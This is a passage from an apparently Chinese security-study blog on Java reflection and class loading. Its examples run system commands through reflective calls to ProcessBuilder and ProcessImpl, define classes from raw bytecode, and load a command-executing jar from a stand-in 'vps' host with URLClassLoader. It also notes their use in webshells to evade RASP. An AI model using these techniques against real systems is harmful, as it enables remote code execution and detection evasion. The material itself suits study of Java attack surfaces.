class="hljs-title">ProcessBuilder</span><span class="hljs-params">(String... command)</span></span><br></code></pre></td></tr></table></figure><ul><li>泛型参数</li></ul><p><code>List&lt;String&gt;</code>，元素为 String 类型的链表集合</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java">Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>        List&lt;String&gt; list= <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        list.add(<span class="hljs-string">&quot;whoami&quot;</span>);<br>        Constructor constructor = pb.getDeclaredConstructor(List.class);<br>        Object newInstance = constructor.newInstance(list);<br>        Method start = pb.getMethod(<span class="hljs-string">&quot;start&quot;</span>);<br>        Process process = (Process) start.invoke(newInstance);<br><br>        InputStream is = p.getInputStream();<br>        InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>        BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>        StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>        String line = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>            sb.append(line);<br>            System.out.println(line);<br>        &#125;<br>        br.close();<br>        isr.close();<br>        is.close();<br></code></pre></td></tr></table></figure><p><code>List.add和Arrays.asList傻傻分不清</code>另一种写法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.util.List;<br><br>Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p = (Process) pb.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(pb.getDeclaredConstructor(List.class).newInstance(Arrays.asList(<span class="hljs-string">&quot;calc&quot;</span>)));<br></code></pre></td></tr></table></figure><p>强调一下，用的是<code>java.util.List</code></p><ul><li>可变参数的构造方法</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p =((ProcessBuilder)pb.getDeclaredConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[]&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;)).start();<br></code></pre></td></tr></table></figure><blockquote><p>Exception in thread “main” java.lang.IllegalArgumentException: argument type mismatch</p></blockquote><p>但是这样会报错，不合法的参数</p><p>原因是这里要传入的是二维数组，可以在上面那个方法调试得知</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p =((ProcessBuilder)pb.getDeclaredConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[][]&#123;&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;&#125;)).start();<br><br><span class="hljs-comment">//start也通过反射获取，需要注意start方法通过反射获得的话，类型强制转换应为Process</span><br>Class pb = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span>);<br>Process p = (Process) pb.getMethod(<span class="hljs-string">&quot;start&quot;</span>).invoke(pb.getDeclaredConstructor(String[].class).newInstance(<span class="hljs-keyword">new</span> String[][]&#123;&#123;<span class="hljs-string">&quot;whoami&quot;</span>&#125;&#125;));<br></code></pre></td></tr></table></figure><h4 id="ProcessImpl"><a href="#ProcessImpl" class="headerlink" title="ProcessImpl"></a>ProcessImpl</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java">String[] cmd = &#123;<span class="hljs-string">&quot;cmd&quot;</span>,<span class="hljs-string">&quot;/c&quot;</span>,<span class="hljs-string">&quot;whoami&quot;</span>&#125;;<br>Class pi = Class.forName(<span class="hljs-string">&quot;java.lang.ProcessImpl&quot;</span>);<br>Method start = pi.getDeclaredMethod(<span class="hljs-string">&quot;start&quot;</span>, String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, <span class="hljs-keyword">boolean</span>.class);<br>start.setAccessible(<span class="hljs-keyword">true</span>);<br>Process pc = (Process) start.invoke(pi, cmd,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">null</span>,<span class="hljs-keyword">false</span>);<br>InputStream is = pc.getInputStream();<br>InputStreamReader isr =  <span class="hljs-keyword">new</span> InputStreamReader(is);<br>BufferedReader br = <span class="hljs-keyword">new</span> BufferedReader(isr);<br>StringBuilder sb=<span class="hljs-keyword">new</span> StringBuilder();<br>String line = <span class="hljs-keyword">null</span>;<br><span class="hljs-keyword">while</span> ((line = br.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>    sb.append(line);<br>    System.out.println(line);<br>&#125;<br>br.close();<br>isr.close();<br>is.close();<br></code></pre></td></tr></table></figure><p>这里与上层的<code>Runtime</code>反射产生联想，为什么没有获取构造方法，然后使用调用<code>newInstance</code>获取实例</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ClassLoader</title>
    <link href="/2022/03/05/ClassLoader/"/>
    <url>/2022/03/05/ClassLoader/</url>
    
    <content type="html"><![CDATA[<h1 id="ClassLoader"><a href="#ClassLoader" class="headerlink" title="ClassLoader"></a>ClassLoader</h1><h2 id="1-类加载机制"><a href="#1-类加载机制" class="headerlink" title="1. 类加载机制"></a>1. 类加载机制</h2><p>Java依赖于<code>JVM</code>(Java虚拟机)实现的跨平台开发语言，程序运行前需要先编译成字节码文件<code>.class</code></p><p>在JVM类加载器中最顶层的是<code>Bootstrap ClassLoader（引导类加载器）</code>、<code>Extension ClassLoader（扩展类加载器）</code>、<code>App ClassLoader（系统类加载器）</code>，<code>AppClassLoader</code>是默认的类加载器，如果类加载时我们不指定类加载器的情况下，默认会使用<code>AppClassLoader</code>加载类，<code>ClassLoader.getSystemClassLoader()</code>返回的系统类加载器也是<code>AppClassLoader</code></p><p>值得注意的是某些时候我们获取一个类的类加载器时候可能会返回一个<code>null</code>值，如:<code>java.io.File.class.getClassLoader()</code>将返回一个<code>null</code>对象，因为<code>java.io.File</code>类在JVM初始化的时候会被<code>Bootstrap ClassLoader（引导类加载器）</code>加载（该类加载器实现于JVM层，采用C++编写），我们在尝试获取被<code>Bootstrap ClassLoader</code>类加载器所加载的类的<code>ClassLoader</code>时候都会返回<code>null</code></p><p><code>ClassLoader</code>类有如下核心方法：</p><ol><li><code>loadClass</code>（加载指定的Java类）</li><li><code>findClass</code>（查找指定的Java类）</li><li><code>findLoadedClass</code>（查找JVM已经加载过的类）</li><li><code>defineClass</code>（定义一个Java类）</li><li><code>resolveClass</code>（链接指定的Java类）</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo</span></span>&#123;<br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>System.out.println(<span class="hljs-string">&quot;hello world&quot;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ClassLoader</code>类加载流程如下：</p><ol><li><code>ClassLoader</code>会调用<code>public Class&lt;?&gt; loadClass(String name)</code>方法加载<code>Demo</code>类。</li><li>调用<code>findLoadedClass</code>方法检查<code>Demo</code>类是否已经初始化，如果JVM已初始化过该类则直接返回类对象。</li><li>如果创建当前<code>ClassLoader</code>时传入了父类加载器（<code>new ClassLoader(父类加载器)</code>）就使用父类加载器加载<code>Demo</code>类，否则使用JVM的<code>Bootstrap ClassLoader</code>加载。</li><li>如果上一步无法加载<code>Demo</code>类，那么调用自身的<code>findClass</code>方法尝试加载<code>Demo</code>类。</li><li>如果当前的<code>ClassLoader</code>没有重写了<code>findClass</code>方法，那么直接返回类加载失败异常。如果当前类重写了<code>findClass</code>方法并通过传入的<code>Demo</code>类名找到了对应的类字节码，那么应该调用<code>defineClass</code>方法去JVM中注册该类。</li><li>如果调用loadClass的时候传入的<code>resolve</code>参数为true，那么还需要调用<code>resolveClass</code>方法链接类，默认为false。</li><li>返回一个被JVM加载后的<code>java.lang.Class</code>类对象。</li></ol><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/JvmSpec7.png"></p><h2 id="2-Java类"><a href="#2-Java类" class="headerlink" title="2. Java类"></a>2. Java类</h2><p>一个Java类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Moonlight</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>JDK自带的<code>javap</code>反编译Moonlight.class</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232052427.png"></p><p><code>hexdump</code>查看二进制字节码文件Moonlight.class</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220305232133753.png"></p><h2 id="3-类的动态加载"><a href="#3-类的动态加载" class="headerlink" title="3. 类的动态加载"></a>3. 类的动态加载</h2><p>Java类加载方式分为<code>显式</code>和<code>隐式</code>，显式通常由<code>Java反射</code>或<code>ClassLoader</code>动态加载类对象，隐式指的是<code>类.方法()</code>或<code>new</code>一个类实例</p><p>所以有两种方式去动态加载类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//反射加载Moonlight实例</span><br>Class.forName(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br><br><span class="hljs-comment">//ClassLoader加载Moonlight实例</span><br><span class="hljs-keyword">this</span>.getClass().getClassLoader().loadClass(<span class="hljs-string">&quot;xxx-package.Moonlight&quot;</span>);<br></code></pre></td></tr></table></figure><blockquote><p>forName(String className)</p><p>forName(String name,boolean initialize,ClassLoader loader)</p></blockquote><p>其中<code>Class.forName(&quot;类&quot;)</code>默认会初始化被加载类的静态属性和方法，重载方法可以设置不初始化类；<code>ClassLoader.loadClass</code>默认不会初始化类方法</p><h2 id="4-自定义ClassLoader"><a href="#4-自定义ClassLoader" class="headerlink" title="4. 自定义ClassLoader"></a>4. 自定义ClassLoader</h2><p><code>java.lang.ClassLoader</code>是所有的类加载器的父类，<code>java.lang.ClassLoader</code>有非常多的子类加载器，比如我们用于加载jar包的<code>java.net.URLClassLoader</code>其本身通过继承<code>java.lang.ClassLoader</code>类，重写了<code>findClass</code>方法从而实现了加载目录class文件甚至是远程资源文件。</p><p>如果存在类Moonlight，调用其一个方法</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220307192239106.png"></p><p>但是类Moonlight不存在于<code>classpath</code>，我们可以自定义类加载器重写<code>findClass</code>方法，然后调用<code>defineClass</code>方法时<strong>传入类Moonlight的字节码向<code>JVM</code>中定义一个类Moonlight类</strong>，最后通过反射调用类Moonlight的方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Demo2</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">ClassLoader</span> </span>&#123;<br><br>    <span class="hljs-comment">// 类名</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> String testClassName = <span class="hljs-string">&quot;Moonlight&quot;</span>;<br><br>    <span class="hljs-comment">// 类字节码</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] testClassBytes = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<br>            -<span class="hljs-number">54</span>, -<span class="hljs-number">2</span>, -<span class="hljs-number">70</span>, -<span class="hljs-number">66</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">51</span>, <span class="hljs-number">0</span>, <span class="hljs-number">17</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">13</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">14</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>,<br>            <span class="hljs-number">16</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">60</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">105</span>, <span class="hljs-number">116</span>, <span class="hljs-number">62</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">86</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">67</span>, <span class="hljs-number">111</span>, <span class="hljs-number">100</span>,<br>            <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">15</span>, <span class="hljs-number">76</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">101</span>, <span class="hljs-number">78</span>, <span class="hljs-number">117</span>, <span class="hljs-number">109</span>, <span class="hljs-number">98</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">84</span>, <span class="hljs-number">97</span>, <span class="hljs-number">98</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>,<br>            <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">104</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">20</span>, <span class="hljs-number">40</span>, <span class="hljs-number">41</span>, <span class="hljs-number">76</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>,<br>            <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">83</span>, <span class="hljs-number">116</span>, <span class="hljs-number">114</span>, <span class="hljs-number">105</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">59</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">83</span>, <span class="hljs-number">111</span>, <span class="hljs-number">117</span>, <span class="hljs-number">114</span>, <span class="hljs-number">99</span>,<br>            <span class="hljs-number">101</span>, <span class="hljs-number">70</span>, <span class="hljs-number">105</span>, <span class="hljs-number">108</span>, <span class="hljs-number">101</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">19</span>, <span class="hljs-number">84</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">116</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>,<br>            <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">46</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">12</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>,<br>            <span class="hljs-number">32</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">126</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">40</span>, <span class="hljs-number">99</span>, <span class="hljs-number">111</span>, <span class="hljs-number">109</span>, <span class="hljs-number">47</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">98</span>, <span class="hljs-number">97</span>, <span class="hljs-number">105</span>, <span class="hljs-number">47</span>,<br>            <span class="hljs-number">115</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">47</span>, <span class="hljs-number">99</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">97</span>, <span class="hljs-number">100</span>, <span class="hljs-number">101</span>, <span class="hljs-number">114</span>, <span class="hljs-number">47</span>, <span class="hljs-number">84</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>,<br>            <span class="hljs-number">116</span>, <span class="hljs-number">72</span>, <span class="hljs-number">101</span>, <span class="hljs-number">108</span>, <span class="hljs-number">108</span>, <span class="hljs-number">111</span>, <span class="hljs-number">87</span>, <span class="hljs-number">111</span>, <span class="hljs-number">114</span>, <span class="hljs-number">108</span>, <span class="hljs-number">100</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">16</span>, <span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">47</span>, <span class="hljs-number">108</span>,<br>            <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">47</span>, <span class="hljs-number">79</span>, <span class="hljs-number">98</span>, <span class="hljs-number">106</span>, <span class="hljs-number">101</span>, <span class="hljs-number">99</span>, <span class="hljs-number">116</span>, <span class="hljs-number">0</span>, <span class="hljs-number">33</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">4</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">29</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-number">42</span>, -<span class="hljs-number">73</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, -<span class="hljs-number">79</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>            <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">9</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">7</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">27</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">3</span>, <span class="hljs-number">18</span>, <span class="hljs-number">2</span>, -<span class="hljs-number">80</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">8</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">6</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>, <span class="hljs-number">11</span>,<br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>, <span class="hljs-number">12</span><br>    &#125;;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Class&lt;?&gt; findClass(String name) <span class="hljs-keyword">throws</span> ClassNotFoundException &#123;<br>        <span class="hljs-comment">// 只处理Moonlight类</span><br>        <span class="hljs-keyword">if</span> (name.equals(testClassName)) &#123;<br>            <span class="hljs-comment">// 调用JVM的native方法定义Moonlight类</span><br>            <span class="hljs-keyword">return</span> defineClass(testClassName, testClassBytes, <span class="hljs-number">0</span>, testClassBytes.length);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">super</span>.findClass(name);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-comment">// 创建自定义的类加载器</span><br>        Demo2 loader = <span class="hljs-keyword">new</span> Demo2();<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 使用自定义的类加载器加载Moonlight类</span><br>            Class testClass = loader.loadClass(testClassName);<br><br>            <span class="hljs-comment">// 反射创建类</span><br>            Object testInstance = testClass.newInstance();<br><br>            <span class="hljs-comment">// 反射获取osname方法</span><br>            Method method = testInstance.getClass().getMethod(<span class="hljs-string">&quot;osname&quot;</span>);<br><br>            <span class="hljs-comment">// 反射调用osname方法</span><br>            String str = (String) method.invoke(testInstance);<br><br>            System.out.println(str);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>自定义类加载器可以在webshell实现加载并调用自己编译的类对象，比如可以命令执行时调用自定义类字节码的native方法绕过RASP检测</p><p>初学存疑：类字节码如何获取<a href="https://blog.csdn.net/generalfu/article/details/112003104">https://blog.csdn.net/generalfu/article/details/112003104</a></p><h2 id="URLClassLoader"><a href="#URLClassLoader" class="headerlink" title="URLClassLoader"></a>URLClassLoader</h2><p>继承ClassLoader的URLClassLoader可以加载远程jar实现类方法调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.anbai.sec.classloader;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.net.URL;<br><span class="hljs-keyword">import</span> java.net.URLClassLoader;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestURLClassLoader</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 定义远程加载的jar路径</span><br>            URL url = <span class="hljs-keyword">new</span> URL(<span class="hljs-string">&quot;vps/cmd.jar&quot;</span>);<br><br>            <span class="hljs-comment">// 创建URLClassLoader对象，并加载远程jar包</span><br>            URLClassLoader ucl = <span class="hljs-keyword">new</span> URLClassLoader(<span class="hljs-keyword">new</span> URL[]&#123;url&#125;);<br><br>            <span class="hljs-comment">// 定义需要执行的系统命令</span><br>            String cmd = <span class="hljs-string">&quot;ls&quot;</span>;<br><br>            <span class="hljs-comment">// 通过URLClassLoader加载远程jar包中的CMD类</span><br>            Class cmdClass = ucl.loadClass(<span class="hljs-string">&quot;CMD&quot;</span>);<br><br>            <span class="hljs-comment">// 调用CMD类中的exec方法，等价于: Process process = CMD.exec(&quot;whoami&quot;);</span><br>            Process process = (Process) cmdClass.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class).invoke(<span class="hljs-keyword">null</span>, cmd);<br><br>            <span class="hljs-comment">// 获取命令执行结果的输入流</span><br>            InputStream           in   = process.getInputStream();<br>            ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>            <span class="hljs-keyword">byte</span>[]                b    = <span class="hljs-keyword">new</span> <span 